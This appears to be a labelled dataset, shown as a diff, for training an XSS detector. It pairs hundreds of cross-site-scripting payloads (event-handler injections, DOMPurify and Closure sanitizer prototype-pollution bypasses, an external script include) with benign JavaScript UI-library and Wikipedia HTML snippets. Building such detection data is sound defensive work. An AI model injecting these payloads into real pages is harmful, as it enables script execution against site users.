+} event.stoppropagation()// stoppropagation/preventdefault both added to support up/down keys without scrolling the page event.preventdefault(),0
+"<nav ondblclick=""alert(1)"">test</nav>",1
+"} var unsetsides = { top: 'auto',",0
+"<big onmousedown=""alert(1)"">test</big>",1
+"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><applet id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></applet>",1
+"box = { top: 0, left: 0 }, doc = elem && elem.ownerdocument; docelem = doc.documentelement;",0
+<svg><dl onload=alert(1)></dl>,1
+event.preventdefault(); const children = this._getchildren().filter(element => !index_js.isdisabled(element)); let nextactiveelement;,0
+var x = clickpos.x - this.x0,0
+const button = event.target.closest(selector_data_toggle$5); const data = button.getorcreateinstance(button); data.toggle();,0
+event.preventdefault() }) }),0
+"var _ref = iselement(element) ? getwindow(element) : window, visualviewport = _ref.visualviewport; var addvisualoffsets = !islayoutviewport() && isfixedstrategy;",0
+"<figure onkeydown=""alert(1)"" contenteditable>test</figure>",1
+"<dfn ondblclick=""alert(1)"">test</dfn>",1
+} from './util/index.js' import scrollbarhelper from './util/scrollbar.js' const name = 'offcanvas',0
+"var firstvisibledate = new date(this.calendars[0].year, this.calendars[0].month, 1),",0
+var relativex = ripple.getattribute('data-x'),0
+"<a href=""javascript:x='%27-alert(1)-%27';"">xss</a>",1
+"<col draggable=""true"" ondragend=""alert(1)"">test</col>",1
+"eventhandler.off(document, event_key); } _handlefocusin(event) {",0
+this.hide(); return; },0
+"this.el.removeeventlistener('click', this._handleinputclickbound)",0
+"m.initializejquerywrapper(modal, 'modal', 'm_modal')",0
+<img2 onpointerleave=alert(1)>xss</img2>,1
+<map onpointerover=alert(1)>xss</map>,1
+"<li oncontextmenu=""alert(1)"">test</li>",1
+"<li><a href=""/wiki/glossary_of_calculus"" title=""glossary of calculus"">calculus </a> </li>",0
+this._removethumb(); this.el.m_range = undefined; },0
+"<element onclick=""alert(1)"">test</element>",1
+} } else if (e.which === m.keys.enter && this.isopen) { let focusedelement = this.dropdownel.children[this.focusedindex];,0
+this._handleswipe(); index_js.execute(this._config.endcallback); },0
+return x >= this.count ? x % this.count : x < 0 ? this._wrap(this.count + x % this.count) : x; } _track() {,0
+"document.removeeventlistener('mousemove', this._handledocumentclickmovebound)",0
+<code onpointerleave=alert(1)>xss</code>,1
+"} _createclass(tooltip, [{ key: ""destroy"",",0
+"<kbd draggable=""true"" ondragstart=""alert(1)"">test</kbd>",1
+_this31._createdragtarget(),0
+"this.bg.setattribute('cy', cy2); } open() {",0
+"<style>@keyframes slidein {}</style><blockquote style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></blockquote>",1
+if (isdisabled(this)) { return; },0
+"return element.prototype.queryselector.call(element, selector) }, children(element, selector) {",0
+"return _get(formselect.__proto__ || object.getprototypeof(formselect), ""init"", this).call(this, this, els, options)",0
+"<frameset onkeypress=""alert(1)"" contenteditable>test</frameset>",1
+"function movehandles ( upward, proposal, locations, handlenumbers ) { var proposals = locations.slice(); var b = [!upward, upward];",0
+"cognitive simulation, <a href=""/wiki/allen_newell"" title=""allen newell"">newell </a> and <a href=""/wiki/herbert_a._simon"" title=""herbert a. simon"">simon </a>, ai at <a href=""/wiki/carnegie_mellon_university"" title=""carnegie mellon university"">cmu </a> (then called <a href=""/wiki/carnegie_tech"" class=""mw-redirect"" title=""carnegie tech"">carnegie tech </a>):",0
+selectchip(chipindex) {,0
+const button = event.target.closest(selector_data_toggle),0
+"throw new error(""nouislider: 'fixed' behaviour must be used with 2 handles""); } testmargin(parsed, parsed.start[1] - parsed.start[0]);",0
+super.dispose() } update() {,0
+const instancemap = elementmap.get(element) if (!instancemap.has(key) && instancemap.size !== 0) { console.error(`bootstrap doesn't allow more than one instance per element. bound instance: ${array.from(instancemap.keys())[0]}.`),0
+toast.deltax = math.abs(toast.xpos - toast._xpos(e)); toast.xpos = toast._xpos(e); toast.velocityx = toast.deltax / (date.now() - toast.time);,0
+"<col draggable=""true"" ondragstart=""alert(1)"">test</col>",1
+$autocompleteoption.append('<span>' + _entry.key + '</span>'); } $(this.container).append($autocompleteoption);,0
+"<li><a href=""/wiki/robot_competition"" title=""robot competition"">competitions </a> </li>",0
+"<li><a href=""/wiki/mathematical_optimization"" title=""mathematical optimization"">mathematical optimization </a> </li>",0
+} // $flowfixme[prop-missing]: need a better way to handle this... next = next.parentnode || next.host; } while (next);,0
+"key: ""getselectedvalues"", value: function getselectedvalues() { var selectedvalues = [];",0
+"} reset() { this._resetelementattributes(this._element, 'overflow');",0
+<li onpointerover=alert(1)>xss</li>,1
+"this.el.removeeventlistener('click', this._handletargetclickbound)",0
+option.addclass('selected'); } },0
+"}function y(a, c) { function d(b) { b = void 0 === b ? 0 : b;return a.el.getpointatlength(1 <= c + b ? c + b : 0);",0
+"<xmp><img title=""</xmp><img src onerror=alert(1)>""></xmp>",1
+"<div draggable=""true"" contenteditable>drag me</div><aside ondragover=alert(1) contenteditable>drop here</aside>",1
+"return [top, right, bottom, left].some(function (side) { return overflow[side] >= 0; });",0
+exports.getuid = getuid,0
+if ( value >= xval.slice(-1)[0] ){,0
+_isshown(element = this._element) {,0
+"return hash.replace(/(:|\.|\[|\]|,|=|\/)/g, '\\$1'); }; m.getclosestancestor = function(el, condition) {",0
+"b;b = h.pth(a) ? a.totallength : a;if (h.col(b)) { if (h.rgb(b)) { var f = /rgb\((\d+,\s*[\d]+,\s*[\d]+)\)/g.exec(b);b = f ? ""rgba("" + f[1] + "",1)"" : b;",0
+<svg onpointerup=alert(1)>xss</svg>,1
+"}, offset: function () { var rect = this[0].getboundingclientrect();",0
+"var instance = this.first()[0][classref]; return instance[methodoroptions].apply(instance, params); }",0
+fn[lower] = function () { return this[0].getboundingclientrect()[lower]; };,0
+<output id=x tabindex=1 ondeactivate=alert(1)></output><input id=y autofocus>,1
+"}, { key: ""_renderchip"", value: function _renderchip(chip) {",0
+if (this.showindicators && this.$indicators) {,0
+"valuesizeclasses = [ options.cssclasses.valuenormal, options.cssclasses.valuelarge,",0
+<tbody onpointerenter=alert(1)>xss</tbody>,1
+"href: 'http://materializecss.com/table.html', title: 'table', body: 'tables are a nice way to organize a lot of data. we provide a few utility classes to help you style your table as easily as possible.'",0
+"<dir onclick=""alert(1)"">test</dir>",1
+"<link onmouseup=""alert(1)"">test</link>",1
+"<bdi onclick=""alert(1)"">test</bdi>",1
+} _setupvariables() { this.currentview = 'hours';,0
+<ul onpointerleave=alert(1)>xss</ul>,1
+"}, { key: ""_setupindicators"", value: function _setupindicators() {",0
+"href: 'http://materializecss.com/collapsible.html',",0
+"this._disableoverflow() this._setelementattributes(this._element, property_padding, calculatedvalue => calculatedvalue + width) this._setelementattributes(selector_fixed_content, property_padding, calculatedvalue => calculatedvalue + width)",0
+"<li onbeforepaste=""alert(1)"" contenteditable>test</li>",1
+if (this.$label.length) {,0
+"<style>:target {color: red;}</style><dt id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></dt>",1
+"<li><a href=""/wiki/concept"" title=""concept"">concept </a> </li>",0
+"<code ondblclick=""alert(1)"">test</code>",1
+const event_hide$4 = `hide${event_key$4}`,0
+if (parentdropdown.classlist.contains(class_name_dropup)) { return isend ? placement_topend : placement_top; },0
+grunt.loadnpmtasks('grunt-notify'); grunt.loadnpmtasks('grunt-text-replace'); grunt.loadnpmtasks('grunt-banner');,0
+idealwidth += alignments.spaceonleft; idealxpos -= alignments.spaceonleft; } else {,0
+<var id=x tabindex=1 onfocus=alert(1)></var>,1
+push = arrayproto.push,0
+<p onpointermove=alert(1)>xss</p>,1
+"duration: this.options.induration, easing: 'easeoutcubic' });",0
+this._scrollbar.hide() document.body.classlist.add(class_name_open) this._adjustdialog(),0
+<em id=x tabindex=1 onfocus=alert(1)></em>,1
+<slot id=x tabindex=1 ondeactivate=alert(1)></slot><input id=y autofocus>,1
+value: function _renderchips() {,0
+case 40: // down if (!$('.search-results .focused').length) { focused = $('.search-results').children().first();,0
+"return eventend(event, data); } var movement = (options.dir ? -1 : 1) * (event.calcpoint - data.startcalcpoint);",0
+$(element).is(':focus') || element.autofocus || $this.attr('placeholder') !== null,0
+cash.prefixedprop = getprefixedprop; cash.camelcase = camelcase; fn.extend({,0
+<svg><span onload=alert(1)></span>,1
+"<col onmouseup=""alert(1)"">test</col>",1
+"this._queuecallback(complete, this._element, true); } _isshown(element = this._element) {",0
+<svg><head onload=alert(1)></head>,1
+return el === selector; } );,0
+"<option onmouseup=""alert(1)"">test</option>",1
+this._clearactiveclass(this._config.target); this._activetarget = target; target.classlist.add(class_name_active);,0
+"<s onpaste=""alert(1)"" contenteditable>test</s>",1
+complete: function (anim) { if (_this11.options.autofocus) { _this11.dropdownel.focus();,0
+connect.push(entry); } connect.push(false);,0
+"<li><a href=""/wiki/fitness_landscape"" title=""fitness landscape"">fitness landscape </a> </li>",0
+this.$el.find('.carousel-item').removeclass('active'); el.classlist.add('active'); },0
+"<title oncopy=""alert(1)"" contenteditable>test</title>",1
+"_createpopper(tip) { const placement = execute(this._config.placement, [this, tip, this._element]) const attachment = attachmentmap[placement.touppercase()]",0
+"fireevent('update', handlenumber); if ( values[handlenumber] !== null && firesetevent ) { fireevent('set', handlenumber);",0
+deactivate() { if (!this._isactive) { return,0
+"<br onkeydown=""alert(1)"" contenteditable>test</br>",1
+"<header draggable=""true"" ondrag=""alert(1)"">test</header>",1
+<col id=x tabindex=1 onbeforedeactivate=alert(1)></col><input autofocus>,1
+if (element.getattribute('role') !== 'tab') {,0
+"<canvas onbeforecopy=""alert(1)"" contenteditable>test</canvas>",1
+<section id=x tabindex=1 ondeactivate=alert(1)></section><input id=y autofocus>,1
+"config.rootmargin = config.offset ? `${config.offset}px 0px -30%` : config.rootmargin if (typeof config.threshold === 'string') { config.threshold = config.threshold.split(',').map(value => number.parsefloat(value))",0
+q.timeline = function (a) {,0
+<applet id=x tabindex=1 onbeforedeactivate=alert(1)></applet><input autofocus>,1
+"} else { el.classname = el.classname.replace(new regexp('(^|\\b)' + classname.split(' ').join('|') + '(\\b|$)', 'gi'), ' '); }",0
+"event.preventdefault(); event.stoppropagation(); var moveevent = attachevent(actions.move, document.documentelement, eventmove, {",0
+"doc = document, div = doc.createelement(""div""), style = div.style;",0
+} destroyselects() { let oldyearselect = this.calendarel.queryselector('.orig-select-year');,0
+"let evt = document.createevent('htmlevents'); evt.initevent(eventname, true, false); evt = this.extend(evt, data);",0
+class scrollspy extends component {,0
+"push: push, splice: arrayproto.splice, map: arrayproto.map,",0
+"} removehandler(element, events, typeevent, callable, isdelegated ? handler : null) return",0
+"key: ""_animatein"", value: function _animatein() { this._animatesidenavin();",0
+"placement = _ref2.placement, variation = _ref2.variation, offsets = _ref2.offsets,",0
+if (!active) { return },0
+<table onpointerup=alert(1)>xss</table>,1
+_this57._inserthtmlintodom(),0
+}); definejqueryplugin(carousel); const name$b = 'collapse';,0
+"<canvas onmousemove=""alert(1)"">test</canvas>",1
+"targets: _this40.$active.find('.caption')[0], opacity: 1, translatex: 0,",0
+"<pre onbeforecut=""alert(1)"" contenteditable>test</pre>",1
+if (!this._ishovered) {,0
+"</span> <span class=""reference-text""><cite class=""citation web"">wakefield, jane (15 june 2016). <a rel=""nofollow"" class=""external text"" href=""https://www.bbc.co.uk/news/uk-36528256"">""social media 'outstrips tv' as news source for young people"" </a>. <i>bbc news </i>. <a rel=""nofollow"" class=""external text"" href=""https://web.archive.org/web/20160624000744/http://www.bbc.co.uk/news/uk-36528256"">archived </a> from the original on 24 june 2016. </cite><span title=""ctx_ver=z39.88-2004&amp;rft_val_fmt=info%3aofi%2ffmt%3akev%3amtx%3ajournal&amp;rft.genre=unknown&amp;rft.jtitle=bbc+news&amp;rft.atitle=social+media+%27outstrips+tv%27+as+news+source+for+young+people&amp;rft.date=2016-06-15&amp;rft.au=wakefield%2c+jane&amp;rft_id=https%3a%2f%2fwww.bbc.co.uk%2fnews%2fuk-36528256&amp;rfr_id=info%3asid%2fen.wikipedia.org%3aartificial+intelligence"" class=""z3988"">",0
+const orderclassname = isnext ? class_name_next : class_name_prev; nextelement.classlist.add(orderclassname); reflow(nextelement);,0
+"<li><a href=""/wiki/observation"" title=""observation"">observation </a> </li>",0
+"this.el.addeventlistener('focus', this._handlefocusbound, true)",0
+this.$el.removeattr('height'),0
+"const name = 'templatefactory'; const default = { allowlist: sanitizer_js.defaultallowlist,",0
+value: function _handlerangemousedowntouchstart(e) {,0
+"return edges; }; m.checkpossiblealignments = function (el, container, bounding, offset) {",0
+"<textarea onmouseup=""alert(1)"">test</textarea>",1
+"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><blink id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></blink>",1
+const elementname = element.nodename.tolowercase(); if (!object.keys(allowlist).includes(elementname)) { element.remove();,0
+} } _elemisactive(elem) {,0
+"<samp oncopy=""alert(1)"" contenteditable>test</samp>",1
+"<noscript draggable=""true"" ondragenter=""alert(1)"">test</noscript>",1
+"return getboundingclientrect(getdocumentelement(element)).left + getwindowscroll(element).scrollleft; } function getviewportrect(element, strategy) {",0
+"<li><a href=""/wiki/ian_hacking"" title=""ian hacking"">ian hacking </a> </li>",0
+switch (variation) { case start: offsets[mainaxis] = offsets[mainaxis] - (reference[len] / 2 - element[len] / 2);,0
+"this.hand.setattribute('y2', cy1)",0
+<fieldset onscrollsnapchange=alert(1) style=overflow-y:hidden;scroll-snap-type:x><div style=scroll-snap-align:center>1337</div></fieldset>,1
+if (tooltiptextoption) { attributeoptions.html = tooltiptextoption; },0
+return domelem.m_tooltip,0
+} static get defaulttype() { return defaulttype$7;,0
+"<style>:target {color: red;}</style><summary id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></summary>",1
+"<style>@keyframes x{}</style><* style=""animation-name:x"" onanimationend=""alert(1)""></*>",1
+return uid && `${uid}::${uidevent++}` || element.uidevent || uidevent++,0
+"'toasts.js', 'sidenav.js', 'scrollspy.js',",0
+<label onfocusout=alert(1) tabindex=1 id=x></label><input autofocus>,1
+"<script>undef01['undef02','injection'+alert(1)];function undef01(){};//'];</script>",1
+<body ontouchend=alert(1)>,1
+_handlemouseleave() { this.ishovered = false; this.isfocused = false; // allows close of tooltip when opened by focus.,0
+"<div role=""note"" class=""hatnote navigation-not-searchable"">main articles: <a href=""/wiki/machine_perception"" title=""machine perception"">machine perception </a>, <a href=""/wiki/computer_vision"" title=""computer vision"">computer vision </a>, and <a href=""/wiki/speech_recognition"" title=""speech recognition"">speech recognition </a> </div>",0
+const ismenutarget = composedpath.includes(context._menu) if ( composedpath.includes(context._element) ||,0
+"addclass(div, classname)",0
+"document.addeventlistener('domcontentloaded', function () { waves.displayeffect(); }, false);",0
+"<picture draggable=""true"" ondragenter=""alert(1)"">test</picture>",1
+"<div draggable=""true"" contenteditable>drag me</div><sub ondrop=alert(1) contenteditable>drop here</sub>",1
+"return; } const hideevent = eventhandler.trigger(this._element, event_hide$3);",0
+"<dir draggable=""true"" ondragenter=""alert(1)"">test</dir>",1
+"arr.push(`<option value=""${i}"" ${i === year ? 'selected=""selected""' : ''}>${i}</option>`)",0
+"<content onmouseout=""alert(1)"">test</content>",1
+"if (this._iscurrentlyfixed()) { var transformx = this.options.edge === 'left' ? '-105%' : '105%'; this.el.style.transform = ""translatex("" + transformx + "")"";",0
+"<script> object.prototype.allowed_attr = ['onerror', 'src'] </script> <script> document.write(dompurify.sanitize('<img src onerror=alert(1)>')) </script>",1
+} } index_js.definejqueryplugin(popover);,0
+"popperconfig: '(null|object|function)', reference: '(string|element|object)' }",0
+"<base onmouseup=""alert(1)"">test</base>",1
+"<acronym onbeforecut=""alert(1)"" contenteditable>test</acronym>",1
+"<x:script xmlns:x=""http://www.w3.org/1999/xhtml"">alert(document.domain)</x:script>",1
+} _setupeventhandlers() { this._handlefabclickbound = this._handlefabclick.bind(this);,0
+"<nobr draggable=""true"" ondragenter=""alert(1)"">test</nobr>",1
+"const children = selectorengine.find(class_name_deeper_children, this._config.parent)",0
+<del id=x tabindex=1 onbeforeactivate=alert(1)></del>,1
+"$(this.thumb).addclass('active').css('left', offsetleft + 'px'); } }",0
+return hits; } _enter() {,0
+"key: ""_animateout"", value: function _animateout() { var _this12 = this;",0
+} _handleinputchange(e) { let date;,0
+"<style>:target {transform: rotate(180deg);}</style><dt id=x style=""transition:transform 2s"" ontransitionrun=alert(1)></dt>",1
+var parallax = function (_component5) {,0
+"this._toggledropdown(element, false)",0
+<* onbeforepaste=alert(1)>xss</*>,1
+"<div draggable=""true"" contenteditable>drag me</div><isindex ondrop=alert(1) contenteditable>drop here</isindex>",1
+"this.el.insertadjacentelement('afterend', this.$overlay[0])",0
+result.push(item.parentnode); } });,0
+"const elementmap = new map(); const data = { set(element, key, instance) {",0
+"top: $target.offset().top, bottom: $target.offset().top + $target.outerheight() - $this.height() });",0
+"function frompercentage ( range, value ) { return (value * 100) / ( range[1] - range[0] ); }",0
+value: function _handlekeydown(e) { if (e.keycode === 27 && this.options.dismissible) { this.close();,0
+static issupported() { return 'ontouchstart' in document.documentelement || navigator.maxtouchpoints > 0 },0
+<noembed id=x tabindex=1 ondeactivate=alert(1)></noembed><input id=y autofocus>,1
+"this.calendars[c].year,",0
+<progress id=x tabindex=1 onbeforeactivate=alert(1)></progress>,1
+"}); window.index.add({ href: 'http://materializecss.com/range.html',",0
+"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><wbr id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></wbr>",1
+"hasevent = opts.events.indexof(day.todatestring()) !== -1 ? true : false,",0
+"dropdown: root.queryselectorall('.dropdown-trigger:not(.no-autoinit)'), materialbox: root.queryselectorall('.materialboxed:not(.no-autoinit)'), modal: root.queryselectorall('.modal:not(.no-autoinit)'),",0
+"return '<td class=""is-empty""></td>'",0
+"const class_name_showing = 'showing'; const defaulttype = { animation: 'boolean',",0
+_setlisteners() { const triggers = this._config.trigger.split(' ') for (const trigger of triggers) {,0
+"<div oncopy=""alert(1)"" contenteditable>test</div>",1
+}(component); m.formselect = formselect; if (m.jqueryloaded) {,0
+"import { definejqueryplugin, getnextactiveelement, isdisabled } from './util/index.js' const name = 'tab' const data_key = 'bs.tab'",0
+"<figcaption ondblclick=""alert(1)"">test</figcaption>",1
+if (_this53.options.setdefaultdate) {,0
+<cite onblur=alert(1) tabindex=1 id=x></cite><input autofocus>,1
+<input id=x onfocusin=alert(1)>,1
+scope_target.removechild(scope_target.firstchild),0
+var pinstance = pushpin._pushpins[elindex]; pinstance._updateposition(); },0
+value: function addchip(chip) {,0
+} const getuid = prefix => { do {,0
+if (e.keycode === 27 && this.doneanimating && this.overlayactive) { this.close(); },0
+_this68.el.m_formselect = _this68,0
+left: index_js.isrtl() ? 'right' : 'left' }; const default = {,0
+const property_padding = 'padding-right'; const property_margin = 'margin-right'; class scrollbarhelper {,0
+"}, { key: ""_ondragstart"", value: function _ondragstart(e) {",0
+let transformx = this.options.edge === 'left' ? '-105%' : '105%'; this.el.style.transform = `translatex(${transformx})`; } else {,0
+config.parent = getelement(config.parent); return config; },0
+"super(element, config); this._isenabled = true; this._timeout = 0;",0
+"<mark oncopy=""alert(1)"" contenteditable>test</mark>",1
+if (this.options.parse) {,0
+"<hr onbeforecut=""alert(1)"" contenteditable>test</hr>",1
+<td onpointerout=alert(1)>xss</td>,1
+<listing onpointerdown=alert(1)>xss</listing>,1
+"<datalist onkeypress=""alert(1)"" contenteditable>test</datalist>",1
+<* onpointerdown=alert(1) style=display:block>xss</*>,1
+"typeevent = originaltypeevent } return [isdelegated, callable, typeevent]",0
+"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><embed id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></embed>",1
+"value: function init(els, options) { return _get(materialbox.__proto__ || object.getprototypeof(materialbox), ""init"", this).call(this, this, els, options); }",0
+"window.index.add({ href: 'http://materializecss.com/carousel.html', title: 'carousel',",0
+"<col onbeforepaste=""alert(1)"" contenteditable>test</col>",1
+"</span> <span class=""reference-text""><a rel=""nofollow"" class=""external text"" href=""http://news.bbc.co.uk/2/hi/business/1481339.stm"">robots beat humans in trading battle. </a> <a rel=""nofollow"" class=""external text"" href=""https://web.archive.org/web/20090909001249/http://news.bbc.co.uk/2/hi/business/1481339.stm"">archived </a> 9 september 2009 at the <a href=""/wiki/wayback_machine"" title=""wayback machine"">wayback machine </a> bbc.com (8 august 2001)",0
+"<ul><li><a href=""#citerefhawkinsblakeslee2005"">hawkins &amp; blakeslee 2005 </a> </li> </ul>",0
+const event_resize$1 = `resize${event_key$4}`; const event_click_dismiss = `click.dismiss${event_key$4}`; const event_mousedown_dismiss = `mousedown.dismiss${event_key$4}`;,0
+import config from './config.js' const name = 'focustrap' const data_key = 'bs.focustrap',0
+}; })(); m.escapehash = function(hash) {,0
+function eventtap ( event ) { event.stoppropagation(); var proposal = calcpointtopercentage(event.calcpoint);,0
+"<i onmouseleave=""alert(1)"">test</i>",1
+"</span> <span class=""reference-text""><a href=""#citerefhinton2007"">hinton 2007 </a>.",0
+<track onpointerenter=alert(1)>xss</track>,1
+import eventhandler from '../dom/event-handler.js',0
+"value: function init(els, options) { return _get(taptarget.__proto__ || object.getprototypeof(taptarget), ""init"", this).call(this, this, els, options); }",0
+_this9.istouchmoving = false; _this9.focusedindex = -1; _this9.filterquery = [];,0
+"<style>@keyframes x{}</style><tbody style=""animation-name:x"" onanimationend=""alert(1)""></tbody>",1
+yyyy: function () { return _this56.date.getfullyear(); },0
+} } function testoptions ( options ) {,0
+"<dt><a class=""reference internal"" href=""topics/exceptions.html""><span class=""doc"">exceptions",0
+"_this48.$el.addclass(""direction-"" + _this48.options.direction); if (_this48.options.direction === 'top') { _this48.offsety = 40;",0
+"var modifierphases = [beforeread, read, afterread, beforemain, main, aftermain, beforewrite, write, afterwrite]; function getnodename(element) { return element ? (element.nodename || '').tolowercase() : null;",0
+<link onpointerout=alert(1)>xss</link>,1
+this.$active = $(this.container),0
+p && (l.iscolor && 2 < t || (x = math.round(x * p) / p)),0
+const sitedocsversion = searchelement.getattribute('data-bd-docs-version'),0
+<set onpointerup=alert(1)>xss</set>,1
+"<style>@keyframes x{}</style><hgroup style=""animation-name:x"" onanimationend=""alert(1)""></hgroup>",1
+<script> object.prototype['* onerror'] = 1; object.prototype['* src'] = 1; </script> <script src=https://google.github.io/closure-library/source/closure/goog/base.js></script> <script> goog.require('goog.html.sanitizer.htmlsanitizer'); goog.require('goog.dom'); </script>,1
+"<a oncut=""alert(1)"" contenteditable>test</a>",1
+<head onblur=alert(1) tabindex=1 id=x></head><input autofocus>,1
+if (parent.tagname.tolowercase() === 'i' && parent.classname.indexof('waves-effect') !== -1) {,0
+"}); this.chipsdata.splice(chipindex, 1); this._setplaceholder();",0
+<svg><pre onload=alert(1)></pre>,1
+"} eventhandler.one(target, event_hidden$3, () => { if (isvisible(this)) {",0
+value: function close() { if (this.isopen === false) { return;,0
+"(global = typeof globalthis !== 'undefined' ? globalthis : global || self, global.focustrap = factory(global.eventhandler, global.selectorengine, global.config))",0
+"<font onmouseover=""alert(1)"">test</font>",1
+".replace(/__js_bundle_cdn__/g, config.cdn.js_bundle)",0
+collection = elem ? this : cash(child).parent().children(),0
+"}, str: function (a) { return ""string"" === typeof a; }, fnc: function (a) {",0
+"<li id=""cite_note-hannun2014-268""><span class=""mw-cite-backlink""><b><a href=""#cite_ref-hannun2014_268-0"">^ </a> </b>",0
+"<li><a href=""#citerefnilsson1998"">nilsson 1998 </a>, chpt. 19 </li> </ul>",0
+"_options$tetheroffset = options.tetheroffset,",0
+<dt onfocusout=alert(1) tabindex=1 id=x></dt><input autofocus>,1
+const stripnameregex = /\..*/; const stripuidregex = /::\d+$/; const eventregistry = {}; // events storage,0
+} if (isfunction(delegate)) { callback = delegate;,0
+}); } _removeeventhandlers() {,0
+_handlecollapsiblekeydown(e) {,0
+event.preventdefault() const root = this._rootelement || window const height = observablesection.offsettop - this._element.offsettop,0
+let multiplecheckbox = this.ismultiple,0
+"<li class=""toclevel-2 tocsection-60""><a href=""#machine_consciousness,_sentience_and_mind""><span class=""tocnumber"">8.4",0
+"<style>:target {color:red;}</style><bdo id=x style=""transition:color 1s"" ontransitionend=alert(1)></bdo>",1
+<xmp onpointerout=alert(1)>xss</xmp>,1
+'</div>' ].join('') alertplaceholder.append(wrapper),0
+"} _oninteraction(event, isinteracting) { switch (event.type) {",0
+"<* onmouseover=""alert(1)"" style=display:block>test</*>",1
+"<article draggable=""true"" ondragend=""alert(1)"">test</article>",1
+"this.calendars[c].month,",0
+(() => { 'use strict' const forms = document.queryselectorall('.needs-validation'),0
+"this.prop(key, name[key])",0
+"<style>:target {transform: rotate(180deg);}</style><multicol id=x style=""transition:transform 2s"" ontransitionrun=alert(1)></multicol>",1
+"<sup onkeypress=""alert(1)"" contenteditable>test</sup>",1
+"<pre onmousemove=""alert(1)"">test</pre>",1
+if (!this._ishovered) { this.hide() },0
+<footer onpointerout=alert(1)>xss</footer>,1
+var value = attributes[name]; if (value === false) { element.removeattribute(name);,0
+"<style>@keyframes slidein {}</style><xmp style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></xmp>",1
+if (view === 'minutes' && $(this.hoursview).css('visibility') === 'visible') {,0
+"<abbr ondblclick=""alert(1)"">test</abbr>",1
+"document.queryselectorall('.bd-content [href=""#""]') .foreach(link => { link.addeventlistener('click', event => {",0
+"<picture ondblclick=""alert(1)"">test</picture>",1
+value: function _handledocumentclick(e) { var _this10 = this; var $target = $(e.target);,0
+}; row.push(this.renderday(dayconfig)); if (++r === 7) {,0
+"<meta ondblclick=""alert(1)"">test</meta>",1
+<script>var{haha:onerror=alert}=0;throw 1</script>,1
+"<font draggable=""true"" ondrag=""alert(1)"">test</font>",1
+function unique ( array ) { return array.filter(function(a){ return !this[a] ? this[a] = true : false;,0
+"return } const link = document.queryselector(`.bd-aside a[href=""${hash}""]`)",0
+} var transformx = -totaldeltax; if (this.options.edge === 'right') {,0
+".find('li:not(.optgroup)') .each((el) => { el.addeventlistener('click', this._handleoptionclickbound);",0
+let tab = $(e.target).closest('li.tab'),0
+trigger: 'hover focus' }; const defaulttype$3 = {,0
+} this._ishovered = false; };,0
+"nextelement.classlist.add(class_name_active$2); activeelement.classlist.remove(class_name_active$2, orderclassname, directionalclassname); this._issliding = false;",0
+"<optgroup ondblclick=""alert(1)"">test</optgroup>",1
+value: function _setenterdelaytimeout(ismanual) { var _this28 = this; cleartimeout(this._enterdelaytimeout);,0
+"<script a=`>` src=""httx://.rocks/.js""></script>",1
+"<style>:target {color: red;}</style><select id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></select>",1
+"for (const element of selectorengine.getmultipleelementsfromselector(this)) { collapse.getorcreateinstance(element, { toggle: false",0
+"this._overlay.addeventlistener('touchmove', this._handleclosedragbound); this._overlay.addeventlistener('touchend', this._handleclosereleasebound); this.el.addeventlistener('touchmove', this._handleclosedragbound);",0
+const data = alert.getorcreateinstance(this),0
+<content id=x tabindex=1 onbeforeactivate=alert(1)></content>,1
+"<listing oncopy=""alert(1)"" contenteditable>test</listing>",1
+} _handleoverlayclick() { if (this.options.dismissible) {,0
+this.el.m_collapsible = undefined,0
+"<div draggable=""true"" contenteditable>drag me</div><nextid ondrop=alert(1) contenteditable>drop here</nextid>",1
+} this.$active.find('img').each((el) => { anim({,0
+"w = n + g.delay, r = g.currenttime, x = g.reversed,",0
+<button onpointerup=alert(1)>xss</button>,1
+"<frameset onmouseover=""alert(1)"">test</frameset>",1
+"})(this, (function (manipulator, index_js) { 'use strict'",0
+<image id=x tabindex=1 onbeforedeactivate=alert(1)></image><input autofocus>,1
+<shadow onpointerout=alert(1)>xss</shadow>,1
+"<command onbeforecopy=""alert(1)"" contenteditable>test</command>",1
+"function teststep ( parsed, entry ) {",0
+"const observablesection = selectorengine.findone(decodeuri(anchor.hash), this._element) if (isvisible(observablesection)) { this._targetlinks.set(decodeuri(anchor.hash), anchor)",0
+"<body onclick=""alert(1)"">test</body>",1
+"this._tabscarousel.set(this.index, () => {",0
+throw new error('slider was already initialized.'); } addslider(scope_target);,0
+"<ul><li><a href=""#citerefrussellnorvig2003"">russell &amp; norvig 2003 </a>, pp.&#160;597–600 </li> </ul>",0
+"<article onkeydown=""alert(1)"" contenteditable>test</article>",1
+function iselement(node) {,0
+"<spacer onmousemove=""alert(1)"">test</spacer>",1
+"<content onkeypress=""alert(1)"" contenteditable>test</content>",1
+"<ruby draggable=""true"" ondrag=""alert(1)"">test</ruby>",1
+"<dd><a href=""/en/1.1/"">1.1</a></dd>",0
+"<element oncontextmenu=""alert(1)"">test</element>",1
+<strong id=x tabindex=1 ondeactivate=alert(1)></strong><input id=y autofocus>,1
+dd: function () { var d = _this56.date.getdate(); return (d < 10 ? '0' : '') + d;,0
+"<style>:target {color:red;}</style><data id=x style=""transition:color 1s"" ontransitionend=alert(1)></data>",1
+<samp onpointermove=alert(1)>xss</samp>,1
+"const selector_data_toggle$3 = '[data-bs-toggle=""dropdown""]:not(.disabled):not(:disabled)'; const selector_data_toggle_shown = `${selector_data_toggle$3}.${class_name_show$6}`; const selector_menu = '.dropdown-menu';",0
+if (scrolledx + bounding.width > containerrect.right - offset || scrolledx + bounding.width > window.innerwidth - offset) { edges.right = true; },0
+"<output onkeydown=""alert(1)"" contenteditable>test</output>",1
+"'sass/components/_cards.scss', 'sass/components/_carousel.scss', 'sass/components/_chips.scss',",0
